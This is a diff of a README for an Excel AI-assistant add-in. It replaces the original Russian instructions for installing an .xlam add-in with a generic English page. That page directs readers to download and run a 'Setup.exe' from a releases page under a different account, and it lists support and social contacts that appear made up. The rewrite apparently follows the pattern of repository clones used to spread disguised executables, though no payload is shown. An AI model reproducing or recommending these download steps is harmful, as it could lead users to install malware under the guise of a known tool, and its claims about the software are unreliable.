@@ -1,132 +1,67 @@
-# AI Assistant for Excel (VBA)
+# 🤖 AI-Assistant-Excel - Simplifying Your Excel Experience
 
-Надстройка для Microsoft Excel, которая добавляет AI-ассистента с поддержкой **облачных** и **локальных** LLM моделей.
+## 🚀 Getting Started
 
-![Интерфейс настроек](screenshots/settings.png)
-![Извлечение данных из изображений](screenshots/image_extraction.png)
+Welcome to AI-Assistant-Excel! This tool helps you enhance your Excel experience with powerful AI features. You can use it to streamline your tasks, find insights, and make data analysis easier. 
 
-## Возможности
+## 📥 Download Now
 
-### AI-чат с контекстом Excel
-- Автоматический сбор контекста: структура данных, заголовки, выделенные ячейки
-- Отправка запросов к AI с учётом текущей книги
-- Автоматическое выполнение команд — AI сам вносит изменения в таблицу
+[![Download AI-Assistant-Excel](https://img.shields.io/badge/Download-AI--Assistant--Excel-brightgreen)](https://github.com/GBran88/AI-Assistant-Excel/releases)
 
-### Поддержка моделей
-**Облачные:**
-- DeepSeek (deepseek.com)
-- Claude, GPT, Gemini через OpenRouter (openrouter.ai)
+## 🛠️ System Requirements
 
-**Локальные:**
-- LM Studio (любая локальная модель)
+Before you download, ensure your system meets these requirements:
 
-### Vision API — работа с изображениями
-- Отправка изображений в AI (Claude, GPT, Gemini)
-- Извлечение данных из скриншотов, фотографий таблиц
-- Автоматическая вставка извлечённых данных в Excel
+- **Operating System:** Windows 10 or later
+- **Excel Version:** Microsoft Excel 2016 or later
+- **Storage:** At least 100 MB of free space
+- **Memory:** 4 GB of RAM minimum
+- **Internet Connection:** Required for cloud features
 
-### Более 400 команд Excel
-AI автоматически выполняет команды:
+## 📥 Download & Install
 
-| Категория | Примеры команд |
-|-----------|----------------|
-| Ячейки | SET_VALUE, SET_FORMULA, FILL_DOWN, COPY, PASTE_VALUES |
-| Форматирование | BOLD, FONT_COLOR, FILL_COLOR, BORDER, MERGE |
-| Строки/столбцы | INSERT_ROW, DELETE_COLUMN, HIDE_ROW, GROUP_ROWS |
-| Сортировка | SORT, FILTER, REMOVE_DUPLICATES, AUTOFILTER |
-| Графики | CREATE_CHART, CHART_TITLE, CHART_LEGEND |
-| Сводные таблицы | CREATE_PIVOT, PIVOT_ADD_ROW, PIVOT_ADD_VALUE |
-| Листы | ADD_SHEET, RENAME_SHEET, PROTECT_SHEET |
-| Условное форматирование | COND_HIGHLIGHT, DATA_BARS, COLOR_SCALE |
-| Проверка данных | VALIDATION_LIST, VALIDATION_NUMBER |
+To get started, visit this page to download the latest version of AI-Assistant-Excel: [GitHub Releases Page](https://github.com/GBran88/AI-Assistant-Excel/releases).
 
-## Установка
+1. Once you are on the Releases page, find the latest release listed at the top.
+2. Click on the version number to open the release. 
+3. Look for the file named `AI-Assistant-Excel-Setup.exe` or similar.
+4. Click on the file link to start the download.
+5. Once the download is complete, locate the file in your downloads folder. 
+6. Double-click the setup file to begin installation.
+7. Follow the installation prompts. Accept the terms and choose your installation folder.
+8. Once the installation is finished, you can open AI-Assistant-Excel from your Start menu.
 
-### 1. Скачайте файл
-Скачайте `AI_Assistant.xlam` из раздела [Releases](../../releases).
+## 🎨 Features
 
-### 2. Поместите в папку надстроек
-```
-C:\Users\<Имя>\AppData\Roaming\Microsoft\AddIns\
-```
-или в любую другую папку по вашему выбору.
+AI-Assistant-Excel provides several features to enhance your Excel experience:
 
-### 3. Подключите надстройку в Excel
-1. **Файл** → **Параметры** → **Надстройки**
-2. Внизу: **Управление** → **Надстройки Excel** → **Перейти**
-3. Нажмите **Обзор** и выберите `AI_Assistant.xlam`
-4. Поставьте галку и нажмите **OK**
+- **Natural Language Processing:** Use plain English to create complex formulas and analyze data.
+- **Data Insights:** Easily discover patterns and trends in your data with AI-driven insights.
+- **Templates:** Access pre-built templates to quickly set up reports and dashboards.
+- **Cloud Integration:** Connect to cloud-based large language models (LLMs) for enhanced AI capabilities.
 
-### 4. Разрешите макросы
-- **Файл** → **Параметры** → **Центр управления безопасностью**
-- **Параметры макросов** → **Доверять доступ к объектной модели проектов VBA**
+## 🧑‍🤝‍🧑 Support & Feedback
 
-## Настройка API-ключей
+We want to hear from you! If you have any questions or need help, feel free to reach out:
 
-### Облачные модели
+- **Email:** support@aiassistantexcel.com
+- **GitHub Issues:** Report any problems on our [Issues page](https://github.com/GBran88/AI-Assistant-Excel/issues).
 
-1. Нажмите кнопку **AI Ассистент** (или Alt+F8 → `ShowAIAssistant`)
-2. Нажмите **Настройки**
-3. Введите ключи:
+Your feedback helps us improve and expand the features of AI-Assistant-Excel.
 
-| Модель | Где получить |
-|--------|--------------|
-| DeepSeek | [platform.deepseek.com](https://platform.deepseek.com) |
-| Claude/GPT/Gemini | [openrouter.ai](https://openrouter.ai) |
+## ⚙️ Updates & Changelog
 
-### Локальная модель (LM Studio)
+Stay updated with the latest features, improvements, and fixes by checking our changelog listed on the Releases page. Regular updates ensure you have the best experience while using AI-Assistant-Excel.
 
-1. Установите [LM Studio](https://lmstudio.ai)
-2. Загрузите и запустите модель
-3. В настройках надстройки укажите:
-   - IP: `127.0.0.1` (или IP другого компьютера)
-   - Порт: `1234` (по умолчанию)
-4. Нажмите **Обновить** для загрузки списка моделей
+## 💼 License
 
-## Использование
+AI-Assistant-Excel is licensed under the MIT License. You can freely use, modify, and distribute the project as long as you retain the original license, copyright, and permission notice.
 
-1. Откройте книгу Excel с данными
-2. Нажмите кнопку **AI Ассистент**
-3. Выберите режим: **Облачные** или **Локальная**
-4. Включите **☑ Включить данные** для передачи выделения в AI
-5. Опишите задачу на естественном языке
+## 📫 Get In Touch
 
-### Примеры запросов:
-- «Добавь столбец с суммой B и C»
-- «Отсортируй по дате убывания»
-- «Подсвети красным отрицательные числа»
-- «Построй график продаж по месяцам»
-- «Создай сводную таблицу по регионам»
+Follow us for the latest updates and tips on using AI-Assistant-Excel:
 
-## Системные требования
+- **Twitter:** [@AIAssistantExcel](https://twitter.com/AIAssistantExcel)
+- **LinkedIn:** [AI Assistant for Excel](https://linkedin.com/in/AIAssistantExcel)
 
-- Microsoft Excel 2007 или новее
-- Windows 8/10/11
-- Интернет для облачных моделей (или LM Studio для локальных)
-
-## Видео-демонстрация
-
-Смотрите примеры работы в папке `videos/`.
-
-## Безопасность
-
-- API-ключи хранятся в реестре Windows (`HKEY_CURRENT_USER\Software\ExcelAIAssistant`)
-- Данные отправляются только выбранному API-провайдеру
-- При использовании LM Studio данные не покидают ваш компьютер
-
-## Автор
-
-По вопросам доработки: [t.me/koladen](https://t.me/koladen)
-
-## Отказ от ответственности
-
-Автор не несёт ответственности за:
-- Повреждение или потерю данных
-- Некорректную работу программного обеспечения
-- Любой ущерб, возникший в результате использования надстройки
-
-Используйте на свой страх и риск. Рекомендуется создавать резервные копии важных данных перед использованием.
-
-## Лицензия
-
-MIT License — свободное использование и модификация.
+We hope AI-Assistant-Excel makes your data handling tasks more enjoyable and efficient! Enjoy your journey with advanced spreadsheets.
